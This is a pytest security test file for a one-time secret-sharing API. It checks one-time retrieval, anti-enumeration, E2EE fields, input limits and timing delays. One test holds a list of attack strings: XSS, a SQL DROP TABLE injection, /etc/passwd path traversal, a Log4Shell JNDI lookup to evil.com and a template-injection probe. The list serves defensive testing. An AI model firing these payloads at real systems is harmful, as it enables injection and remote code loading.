# backend/tests/test_security.py
import pytest
import json
import time
from unittest.mock import patch


class TestBasicSecurity:
    """Test cases to verify basic security functionality."""
    
    def test_secure_secret_storage_and_retrieval(self, client, app_context):
        """Test that secrets can be securely stored and retrieved."""
        test_secret = "This is a secure test secret"
        
        # Store a secret
        response = client.post('/api/share',
                             data=json.dumps({"payload": test_secret}),
                             content_type='application/json')
        
        assert response.status_code == 201
        data = json.loads(response.data)
        assert 'link_id' in data
        link_id = data['link_id']
        
        # Retrieve the secret
        response = client.get(f'/api/share/secret/{link_id}')
        assert response.status_code == 200
        retrieved_data = json.loads(response.data)
        assert retrieved_data['payload'] == test_secret
        
        # Verify one-time access - second retrieval should return dummy data
        response2 = client.get(f'/api/share/secret/{link_id}')
        assert response2.status_code == 200
        dummy_data = json.loads(response2.data)
        assert dummy_data['payload'] == "Dummy payload for non-existent secret"

    def test_anti_enumeration_security(self, client):
        """Test that non-existent secrets return dummy data to prevent enumeration."""
        # Try to retrieve a non-existent secret
        fake_id = "00000000-0000-0000-0000-000000000000"
        response = client.get(f'/api/share/secret/{fake_id}')
        
        # Should return 200 with dummy data (anti-enumeration)
        assert response.status_code == 200
        data = json.loads(response.data)
        assert data['payload'] == "Dummy payload for non-existent secret"
        assert 'e2ee' in data  # Should include dummy E2EE data
        
    def test_e2ee_security(self, client):
        """Test E2EE (End-to-End Encryption) functionality."""
        e2ee_data = {
            "payload": "encrypted_payload_from_client",
            "mime": "text/plain",
            "e2ee": {
                "salt": "test_salt_value",
                "nonce": "test_nonce_value"
            }
        }
        
        # Store E2EE secret
        response = client.post('/api/share',
                             data=json.dumps(e2ee_data),
                             content_type='application/json')
        
        assert response.status_code == 201
        data = json.loads(response.data)
        assert data['e2ee'] is True
        link_id = data['link_id']
        
        # Retrieve E2EE secret
        response = client.get(f'/api/share/secret/{link_id}')
        assert response.status_code == 200
        retrieved_data = json.loads(response.data)
        assert retrieved_data['payload'] == "encrypted_payload_from_client"
        assert retrieved_data['e2ee']['salt'] == "test_salt_value"
        assert retrieved_data['e2ee']['nonce'] == "test_nonce_value"

    def test_input_validation_security(self, client):
        """Test input validation for security."""
        # Test missing payload
        response = client.post('/api/share',
                             data=json.dumps({}),
                             content_type='application/json')
        assert response.status_code == 400
        
        # Test invalid payload type
        response = client.post('/api/share',
                             data=json.dumps({"payload": 123}),
                             content_type='application/json')
        assert response.status_code == 400
        
        # Test invalid mime type
        response = client.post('/api/share',
                             data=json.dumps({"payload": "test", "mime": 123}),
                             content_type='application/json')
        assert response.status_code == 400

    def test_request_size_limits(self, client):
        """Test that large payloads are rejected."""
        # Create a payload larger than the limit (100KB)
        large_payload = "A" * (110 * 1024)  # 110KB
        
        response = client.post('/api/share',
                             data=json.dumps({"payload": large_payload}),
                             content_type='application/json')
        assert response.status_code == 413

    def test_timing_attack_resistance(self, client):
        """Test that response times are consistent to prevent timing attacks."""
        # Test multiple non-existent secret retrievals
        fake_ids = [
            "11111111-1111-1111-1111-111111111111",
            "22222222-2222-2222-2222-222222222222", 
            "33333333-3333-3333-3333-333333333333"
        ]
        
        response_times = []
        for fake_id in fake_ids:
            start_time = time.time()
            response = client.get(f'/api/share/secret/{fake_id}')
            end_time = time.time()
            
            assert response.status_code == 200  # Anti-enumeration
            response_times.append(end_time - start_time)
        
        # All response times should include the built-in delay (5-25ms minimum)
        for response_time in response_times:
            assert response_time >= 0.005  # At least 5ms delay

    def test_json_content_type_requirement(self, client):
        """Test that non-JSON requests are rejected."""
        response = client.post('/api/share',
                             data="payload=test",
                             content_type='application/x-www-form-urlencoded')
        assert response.status_code == 400

    def test_malicious_payload_handling(self, client):
        """Test that malicious payloads are stored safely."""
        malicious_payloads = [
            "<script>alert('XSS')</script>",
            "'; DROP TABLE secrets; --",
            "../../etc/passwd",
            "${jndi:ldap://evil.com/}",
            "{{7*7}}"
        ]
        
        for payload in malicious_payloads:
            # Should store without error (payload is encrypted)
            response = client.post('/api/share',
                                 data=json.dumps({"payload": payload}),
                                 content_type='application/json')
            assert response.status_code == 201
            
            # Should retrieve the exact same payload
            link_id = json.loads(response.data)['link_id']
            response = client.get(f'/api/share/secret/{link_id}')
            assert response.status_code == 200
            retrieved_data = json.loads(response.data)
            assert retrieved_data['payload'] == payload

    def test_health_endpoint_security(self, client):
        """Test that health endpoint doesn't leak sensitive information."""
        response = client.get('/health')
        assert response.status_code == 200
        data = json.loads(response.data)
        
        # Should only contain basic status info
        assert 'status' in data
        assert data['status'] == 'healthy'
        
        # Should not contain sensitive configuration or system info
        response_text = response.get_data(as_text=True).lower()
        forbidden_terms = ['password', 'key', 'secret', 'token', 'credential']
        for term in forbidden_terms:
            assert term not in response_text